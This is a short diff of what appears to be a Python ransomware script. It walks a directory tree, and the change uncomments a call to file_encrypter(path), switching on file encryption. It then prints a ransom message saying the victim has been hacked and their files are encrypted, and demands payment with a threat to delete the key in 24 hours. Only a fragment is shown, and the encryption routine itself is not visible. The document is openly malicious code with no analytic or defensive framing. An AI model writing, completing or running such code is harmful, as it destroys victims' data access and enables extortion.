@@ -51,7 +51,7 @@ for target in os.listdir(working_directory) :
          get_root_files(target)
     else :
          pass
-         #file_encrypter(path)  
+         file_encrypter(path)  
 print(colorama.Fore.RED + 'You have been hacked')
 print('All your files are encrypted')
 print('Pay me money or i will delete the key in 24 hours ....')
